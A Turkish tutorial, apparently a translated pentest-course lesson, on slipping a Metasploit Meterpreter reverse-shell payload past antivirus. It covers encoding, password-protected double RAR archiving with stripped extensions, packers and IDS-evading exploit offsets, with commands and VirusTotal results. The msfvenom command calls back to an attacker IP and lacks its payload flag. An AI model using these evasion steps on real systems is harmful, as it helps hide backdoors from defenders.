Dosya, klasör, komut dosyası, yürütülebilir dosya, resim veya belge gibi bir bilgi parçasını arşivlemek ve arşive bir parola yerleştirmek, günümüzde yaygın olarak kullanılan birçok anti-virüs imzasını atlatır. Ancak bu işlemin dezavantajı, AV alarm panosunda bir parola ile kilitlendikleri için taranamadıkları şeklinde bildirim olarak gösterilmeleridir. Bir yönetici bu arşivlerin kötü amaçlı olup olmadığını belirlemek için manuel olarak incelemeyi seçebilir.

#### **Payload Oluşturma**
```shell-session
M1R4CKCK@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5

Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 27 (iteration=0)
x86/shikata_ga_nai succeeded with size 54 (iteration=1)
x86/shikata_ga_nai succeeded with size 81 (iteration=2)
x86/shikata_ga_nai succeeded with size 108 (iteration=3)
x86/shikata_ga_nai succeeded with size 135 (iteration=4)
x86/shikata_ga_nai chosen with final size 135
Payload size: 135 bytes
Saved as: /home/user/test.js
```

```shell-session
M1R4CKCK@htb[/htb]$ cat test.js

�+n"����t$�G4ɱ1zz��j�V6����ic��o�Bs>��Z*�����9vt��%��1�
<...SNIP...>
�Qa*���޴��RW�%Š.\�=;.l�T���XF���T��
```

Oluşturduğumuz payload'tan bir tespit temel çizgisi elde etmek için VirusTotal'e bakarsak, sonuçlar aşağıdaki gibi olacaktır.

#### VirusTotal
```shell-session
M1R4CKCK@htb[/htb]$ msf-virustotal -k <API key> -f test.js 

[*] WARNING: When you upload or otherwise submit content, you give VirusTotal
[*] (and those we work with) a worldwide, royalty free, irrevocable and transferable
[*] licence to use, edit, host, store, reproduce, modify, create derivative works,
[*] communicate, publish, publicly perform, publicly display and distribute such
[*] content. To read the complete Terms of Service for VirusTotal, please go to the
[*] following link:
[*] https://www.virustotal.com/en/about/terms-of-service/
[*] 
[*] If you prefer your own API key, you may obtain one at VirusTotal.

[*] Enter 'Y' to acknowledge: Y


[*] Using API key: <API key>
[*] Please wait while I upload test.js...
[*] VirusTotal: Scan request successfully queued, come back later for the report
[*] Sample MD5 hash    : 35e7687f0793dc3e048d557feeaf615a
[*] Sample SHA1 hash   : f2f1c4051d8e71df0741b40e4d91622c4fd27309
[*] Sample SHA256 hash : 08799c1b83de42ed43d86247ebb21cca95b100f6a45644e99b339422b7b44105
[*] Analysis link: https://www.virustotal.com/gui/file/<SNIP>/detection/f-<SNIP>-1652167047
[*] Requesting the report...
[*] Received code 0. Waiting for another 60 seconds...
[*] Analysis Report: test.js (11 / 59): <...SNIP...>
====================================================================================================

 Antivirus             Detected  Version               Result                             Update
 ---------             --------  -------               ------                             ------
 ALYac                 true      1.1.3.1               Exploit.Metacoder.Shikata.Gen      20220510
 AVG                   true      21.1.5827.0           Win32:ShikataGaNai-A [Trj]         20220510
 Acronis               false     1.2.0.108                                                20220426
 Ad-Aware              true      3.0.21.193            Exploit.Metacoder.Shikata.Gen      20220510
 AhnLab-V3             false     3.21.3.10230                                             20220510
 Antiy-AVL             false     3.0                                                      20220510
 Arcabit               false     1.0.0.889                                                20220510
 Avast                 true      21.1.5827.0           Win32:ShikataGaNai-A [Trj]         20220510
 Avira                 false     8.3.3.14                                                 20220510
 Baidu                 false     1.0.0.2                                                  20190318
 BitDefender           true      7.2                   Exploit.Metacoder.Shikata.Gen      20220510
 BitDefenderTheta      false     7.2.37796.0                                              20220428
 Bkav                  false     1.3.0.9899                                               20220509
 CAT-QuickHeal         false     14.00                                                    20220510
 CMC                   false     2.10.2019.1                                              20211026
 ClamAV                true      0.105.0.0             Win.Trojan.MSShellcode-6360729-0   20220509
 Comodo                false     34607                                                    20220510
 Cynet                 false     4.0.0.27                                                 20220510
 Cyren                 false     6.5.1.2                                                  20220510
 DrWeb                 false     7.0.56.4040                                              20220510
 ESET-NOD32            false     25243                                                    20220510
 Emsisoft              true      2021.5.0.7597         Exploit.Metacoder.Shikata.Gen (B)  20220510
 F-Secure              false     18.10.978.51                                             20220510
 FireEye               true      35.24.1.0             Exploit.Metacoder.Shikata.Gen      20220510
 Fortinet              false     6.2.142.0                                                20220510
 GData                 true      A:25.33002B:27.27300  Exploit.Metacoder.Shikata.Gen      20220510
 Gridinsoft            false     1.0.77.174                                               20220510
 Ikarus                false     6.0.24.0                                                 20220509
 Jiangmin              false     16.0.100                                                 20220509
 K7AntiVirus           false     12.12.42275                                              20220510
 K7GW                  false     12.12.42275                                              20220510
 Kaspersky             false     21.0.1.45                                                20220510
 Kingsoft              false     2017.9.26.565                                            20220510
 Lionic                false     7.5                                                      20220510
 MAX                   true      2019.9.16.1           malware (ai score=89)              20220510
 Malwarebytes          false     4.2.2.27                                                 20220510
 MaxSecure             false     1.0.0.1                                                  20220510
 McAfee                false     6.0.6.653                                                20220510
 McAfee-GW-Edition     false     v2019.1.2+3728                                           20220510
 MicroWorld-eScan      true      14.0.409.0            Exploit.Metacoder.Shikata.Gen      20220510
 Microsoft             false     1.1.19200.5                                              20220510
 NANO-Antivirus        false     1.0.146.25588                                            20220510
 Panda                 false     4.6.4.2                                                  20220509
 Rising                false     25.0.0.27                                                20220510
 SUPERAntiSpyware      false     5.6.0.1032                                               20220507
 Sangfor               false     2.14.0.0                                                 20220507
 Sophos                false     1.4.1.0                                                  20220510
 Symantec              false     1.17.0.0                                                 20220510
 TACHYON               false     2022-05-10.02                                            20220510
 Tencent               false     1.0.0.1                                                  20220510
 TrendMicro            false     11.0.0.1006                                              20220510
 TrendMicro-HouseCall  false     10.0.0.1040                                              20220510
 VBA32                 false     5.0.0                                                    20220506
 ViRobot               false     2014.3.20.0                                              20220510
 VirIT                 false     9.5.191                                                  20220509
 Yandex                false     5.5.2.24                                                 20220428
 Zillya                false     2.0.0.4627                                               20220509
 ZoneAlarm             false     1.0                                                      20220510
 Zoner                 false     2.2.2.0       
```

Şimdi, iki kez arşivlemeyi deneyin, her iki arşivi de oluşturduktan sonra şifreleyin ve adlarından `.rar`/`.zip`/`.7z` uzantısını kaldırın. Bu amaçla, Windows'ta WinRAR gibi çalışan RARLabs'ın RAR [yardımcı programını](https://www.rarlab.com/download.htm) yükleyebiliriz.


#### Archiving the Payload
```shell-session
M1R4CKCK@htb[/htb]$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
M1R4CKCK@htb[/htb]$ tar -xzvf rarlinux-x64-612.tar.gz && cd rar
M1R4CKCK@htb[/htb]$ rar a ~/test.rar -p ~/test.js

Enter password (will not be echoed): ******
Reenter password: ******

RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
Trial version             Type 'rar -?' for help
Evaluation copy. Please register.

Creating archive test.rar
Adding    test.js                                                     OK 
Done
```

```shell-session
M1R4CKCK@htb[/htb]$ ls

test.js   test.rar
```

#### **.RAR Uzantısını Kaldırma**
```shell-session
M1R4CKCK@htb[/htb]$ mv test.rar test
M1R4CKCK@htb[/htb]$ ls

test   test.js
```

#### Archiving the Payload Again
```shell-session
M1R4CKCK@htb[/htb]$ rar a test2.rar -p test

Enter password (will not be echoed): ******
Reenter password: ******

RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
Trial version             Type 'rar -?' for help
Evaluation copy. Please register.

Creating archive test2.rar
Adding    test                                                        OK 
Done
```


#### **.RAR Uzantısını Kaldırma**
```shell-session
M1R4CKCK@htb[/htb]$ mv test2.rar test2
M1R4CKCK@htb[/htb]$ ls

test   test2   test.js
```

Test2 dosyası, adından uzantısı (.rar) silinmiş son .rar arşividir. Bundan sonra, başka bir kontrol için VirusTotal'a yüklemeye devam edebiliriz.


#### VirusTotal
```shell-session
M1R4CKCK@htb[/htb]$ msf-virustotal -k <API key> -f test2

[*] Using API key: <API key>
[*] Please wait while I upload test2...
[*] VirusTotal: Scan request successfully queued, come back later for the report
[*] Sample MD5 hash    : 2f25eeeea28f737917e59177be61be6d
[*] Sample SHA1 hash   : c31d7f02cfadd87c430c2eadf77f287db4701429
[*] Sample SHA256 hash : 76ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad
[*] Analysis link: https://www.virustotal.com/gui/file/<SNIP>/detection/f-<SNIP>-1652167804
[*] Requesting the report...
[*] Received code 0. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Analysis Report: test2 (0 / 49): 76ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad
=================================================================================================

 Antivirus             Detected  Version         Result  Update
 ---------             --------  -------         ------  ------
 ALYac                 false     1.1.3.1                 20220510
 Acronis               false     1.2.0.108               20220426
 Ad-Aware              false     3.0.21.193              20220510
 AhnLab-V3             false     3.21.3.10230            20220510
 Antiy-AVL             false     3.0                     20220510
 Arcabit               false     1.0.0.889               20220510
 Avira                 false     8.3.3.14                20220510
 BitDefender           false     7.2                     20220510
 BitDefenderTheta      false     7.2.37796.0             20220428
 Bkav                  false     1.3.0.9899              20220509
 CAT-QuickHeal         false     14.00                   20220510
 CMC                   false     2.10.2019.1             20211026
 ClamAV                false     0.105.0.0               20220509
 Comodo                false     34606                   20220509
 Cynet                 false     4.0.0.27                20220510
 Cyren                 false     6.5.1.2                 20220510
 DrWeb                 false     7.0.56.4040             20220510
 ESET-NOD32            false     25243                   20220510
 Emsisoft              false     2021.5.0.7597           20220510
 F-Secure              false     18.10.978.51            20220510
 FireEye               false     35.24.1.0               20220510
 Fortinet              false     6.2.142.0               20220510
 Gridinsoft            false     1.0.77.174              20220510
 Jiangmin              false     16.0.100                20220509
 K7AntiVirus           false     12.12.42275             20220510
 K7GW                  false     12.12.42275             20220510
 Kingsoft              false     2017.9.26.565           20220510
 Lionic                false     7.5                     20220510
 MAX                   false     2019.9.16.1             20220510
 Malwarebytes          false     4.2.2.27                20220510
 MaxSecure             false     1.0.0.1                 20220510
 McAfee-GW-Edition     false     v2019.1.2+3728          20220510
 MicroWorld-eScan      false     14.0.409.0              20220510
 NANO-Antivirus        false     1.0.146.25588           20220510
 Panda                 false     4.6.4.2                 20220509
 Rising                false     25.0.0.27               20220510
 SUPERAntiSpyware      false     5.6.0.1032              20220507
 Sangfor               false     2.14.0.0                20220507
 Symantec              false     1.17.0.0                20220510
 TACHYON               false     2022-05-10.02           20220510
 Tencent               false     1.0.0.1                 20220510
 TrendMicro-HouseCall  false     10.0.0.1040             20220510
 VBA32                 false     5.0.0                   20220506
 ViRobot               false     2014.3.20.0             20220510
 VirIT                 false     9.5.191                 20220509
 Yandex                false     5.5.2.24                20220428
 Zillya                false     2.0.0.4627              20220509
 ZoneAlarm             false     1.0                     20220510
 Zoner                 false     2.2.2.0                 20220509
```

Yukarıdan da görebileceğimiz gibi, bu hem hedef host' `a` hem `de` hedef host'tan veri aktarmak için mükemmel bir yoldur.

## **Packers**  

`Paketleyici` terimi, payload'un çalıştırılabilir bir program ve dekompresyon koduyla birlikte tek bir dosyada paketlendiği bir çalıştırılabilir `sıkıştırma` işleminin sonucunu ifade eder. Çalıştırıldığında, dekompresyon kodu arka kapaklı yürütülebilir dosyayı orijinal durumuna döndürür ve hedef hostlardaki dosya tarama mekanizmalarına karşı başka bir koruma katmanı sağlar. Bu işlem, sıkıştırılmış yürütülebilir dosyanın orijinal yürütülebilir dosyayla aynı şekilde çalıştırılması ve tüm orijinal işlevlerinin korunması için şeffaf bir şekilde gerçekleşir. Buna ek olarak msfvenom, arka kapılı bir yürütülebilir dosyanın dosya yapısını sıkıştırma ve değiştirme ve altta yatan işlem yapısını şifreleme yeteneği sağlar.  

Popüler paketleyici yazılımların bir listesi:

|   |   |   |
|---|---|---|
|[UPX packer](https://upx.github.io/)|[The Enigma Protector](https://enigmaprotector.com/)|[MPRESS](https://web.archive.org/web/20240310213323/https://www.matcode.com/mpress.htm)|
|Alternate EXE Packer|ExeStealth|Morphine|
|MEW|Themida|

Paketleyiciler hakkında daha fazla bilgi edinmek istiyorsak, lütfen [PolyPack projesine](https://jon.oberheide.org/files/woot09-polypack.pdf) göz atın.


## **Exploit Kodlama**  

İstismarımızı kodlarken veya önceden var olan bir istismarı Framework'e taşırken, istismar kodunun hedef sistemde uygulanan güvenlik önlemleri tarafından kolayca tanımlanamayacağından emin olmak iyidir.  

Örneğin, tipik bir `Buffer Overflow` istismarı, hexadecimal buffer desenleri nedeniyle ağ üzerinden seyahat eden normal trafikten kolayca ayırt edilebilir. IDS / IPS yerleşimleri, hedef makineye yönelik trafiği kontrol edebilir ve kodu istismar etmek için aşırı kullanılan belirli kalıpları fark edebilir.  

Exploit kodumuzu bir araya getirirken, randomizasyon, iyi bilinen exploit buffer'ları için IPS / IDS veritabanı imzalarını kıracak olan bu kalıplara bazı varyasyonlar eklemeye yardımcı olabilir. Bu, msfconsole modülü için kodun içine bir `Ofset` anahtarı girilerek yapılabilir:

```ruby
'Targets' =>
[
 	[ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
],
```

BoF kodunun yanı sıra, taşma tamamlandıktan sonra shellcode'un inmesi gereken bariz NOP sled'leri kullanmaktan her zaman kaçınılmalıdır. BoF kodunun amacının hedef makinede çalışan hizmeti çökertmek olduğunu, NOP kızağının ise shellcode'umuzun (yük) yerleştirildiği ayrılmış bellek olduğunu lütfen unutmayın. IPS/IDS varlıkları bunların her ikisini de düzenli olarak kontrol eder, bu nedenle özel istismar kodumuzu istemci ağına dağıtmadan önce bir sandbox ortamında test etmek iyi olur. Elbette, bir değerlendirme sırasında bunu doğru bir şekilde yapmak için yalnızca bir şansımız olabilir.

Exploit kodlama hakkında daha fazla bilgi için No Starch Press'in Metasploit - The Penetration Tester's Guide kitabına göz atmanızı öneririz. Framework için istismarlarımızı oluşturma konusunda oldukça ayrıntılı bilgi veriyorlar.
https://nostarch.com/metasploit



## **Meterpreter'ı Kaynak Koddan Yeniden Derleme**  

İzinsiz Giriş Önleme Sistemleri ve Antivirüs Motorları, hedefte ilk dayanak noktasını vurabilecek en yaygın savunma araçlarıdır. Bunlar çoğunlukla tüm kötü amaçlı dosyanın veya taslak aşamasının imzaları üzerinde çalışır.

